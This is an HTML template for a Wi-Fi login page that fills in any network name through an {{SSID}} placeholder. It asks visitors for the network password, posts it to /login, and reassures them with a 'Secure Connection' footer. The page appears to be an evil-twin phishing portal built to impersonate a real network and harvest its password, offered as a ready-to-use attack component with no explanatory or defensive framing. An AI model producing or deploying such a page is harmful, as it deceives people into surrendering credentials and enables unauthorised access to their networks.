<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{SSID}} - Connect</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
        }
        .container {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            padding: 40px;
            width: 90%;
            max-width: 400px;
            text-align: center;
        }
        .wifi-icon {
            font-size: 48px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 22px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        .ssid-name {
            color: #4fc3f7;
            font-size: 18px;
            margin-bottom: 24px;
        }
        p.desc {
            color: #aaa;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        form { text-align: left; }
        label {
            display: block;
            color: #aaa;
            font-size: 12px;
            margin-bottom: 6px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        input {
            width: 100%;
            padding: 12px 16px;
            margin-bottom: 16px;
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 8px;
            background: rgba(0, 0, 0, 0.3);
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s;
        }
        input:focus { border-color: #4fc3f7; }
        input::placeholder { color: #555; }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #4fc3f7, #0288d1);
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: opacity 0.2s;
            margin-top: 8px;
        }
        button:hover { opacity: 0.9; }
        .footer {
            margin-top: 24px;
            color: #555;
            font-size: 11px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="wifi-icon">&#x1F4F6;</div>
        <h1>WiFi Authentication</h1>
        <div class="ssid-name">{{SSID}}</div>
        <p class="desc">Please enter your WiFi password to connect to this network.</p>
        <form method="POST" action="/login">
            <label>WiFi Password</label>
            <input type="password" name="password" placeholder="Enter network password" required autofocus>
            <button type="submit">Connect</button>
        </form>
        <div class="footer">Secure Connection &bull; Network Authentication Required</div>
    </div>
</body>
</html>
